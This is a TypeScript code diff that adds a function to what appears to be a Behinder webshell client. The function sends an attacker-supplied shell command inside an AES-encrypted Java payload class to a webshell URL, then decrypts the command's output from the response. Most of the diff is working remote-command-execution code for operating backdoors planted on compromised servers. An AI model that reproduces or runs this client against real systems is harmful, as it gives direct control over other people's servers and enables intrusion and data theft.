@@ -11,11 +11,16 @@
  *      parser tries every combination and validates the JSON envelope
  *   4. connected iff status == "success" and msg echoes the random string
  */
-import { ECHO_CLASS_BYTES } from "./assets.js";
+import { CMD_CLASS_BYTES, ECHO_CLASS_BYTES } from "./assets.js";
 import { injectStringConstant } from "./classfile.js";
 import { aesEcbDecrypt, aesEcbEncrypt, md5Key16, randomString } from "./crypto.js";
 import { postRaw } from "./http.js";
-import { buildHeaders, type CommonConnectOptions, type ConnectTestResult } from "./types.js";
+import {
+  buildHeaders,
+  type CommonConnectOptions,
+  type ConnectTestResult,
+  type ExecResult,
+} from "./types.js";
 
 export interface BehinderConnectOptions extends CommonConnectOptions {
   /** Request body encoding. Default: try base64, then raw AES bytes. */
@@ -163,4 +168,79 @@ export async function testBehinder(
     error: failures.join("; ") + " — wrong password, missing gate header, or not a Behinder shell",
     durationMs: Date.now() - started,
   };
+}
+
+/**
+ * Behinder command execution — uploads the `Cmd` payload class with its
+ * static `cmd` field filled in (same `Params.getParamedClass` mechanism as
+ * the Echo payload). The payload picks `cmd.exe /c` or `/bin/sh -c` itself
+ * based on `os.name`, so no OS detection is needed here.
+ * The response is the usual Behinder envelope: base64(AES({status, msg})),
+ * where `msg` is the base64-encoded command output (stdout then stderr).
+ */
+export async function execBehinder(
+  url: string,
+  pass: string,
+  command: string,
+  options: BehinderConnectOptions = {},
+): Promise<ExecResult> {
+  const started = Date.now();
+  const key = md5Key16(pass);
+  const classBytes = injectStringConstant(CMD_CLASS_BYTES, "cmd", command);
+
+  const fail = (error: string): ExecResult => ({
+    ok: false,
+    tool: "behinder",
+    url,
+    command,
+    error,
+    durationMs: Date.now() - started,
+  });
+
+  const encodings: Array<"base64" | "raw"> =
+    options.requestEncoding === "raw"
+      ? ["raw"]
+      : options.requestEncoding === "base64"
+        ? ["base64"]
+        : ["base64", "raw"];
+
+  const failures: string[] = [];
+  for (const encoding of encodings) {
+    const encrypted = aesEcbEncrypt(classBytes, key);
+    const body = encoding === "base64" ? Buffer.from(encrypted.toString("base64")) : encrypted;
+    let response;
+    try {
+      response = await postRaw(url, body, {
+        headers: buildHeaders({ "Content-Type": "application/octet-stream" }, options),
+        timeoutMs: options.timeoutMs,
+        insecure: options.insecure,
+      });
+    } catch (err) {
+      return fail(err instanceof Error ? err.message : String(err));
+    }
+
+    const envelope = parseEchoResponse(response.body, key);
+    if (envelope) {
+      if (envelope.status === "success") {
+        return {
+          ok: true,
+          tool: "behinder",
+          url,
+          command,
+          output: envelope.msg,
+          durationMs: Date.now() - started,
+        };
+      }
+      // the payload executed but reported failure — its msg says why
+      return fail(`remote status "fail": ${envelope.msg}`);
+    }
+    failures.push(
+      `${encoding}: HTTP ${response.status}, response not a valid Behinder envelope` +
+        (response.body.length > 0 ? ` (starts with: ${excerpt(response.body)})` : " (empty body)"),
+    );
+  }
+
+  return fail(
+    failures.join("; ") + " — wrong password, missing gate header, or not a Behinder shell",
+  );
 }
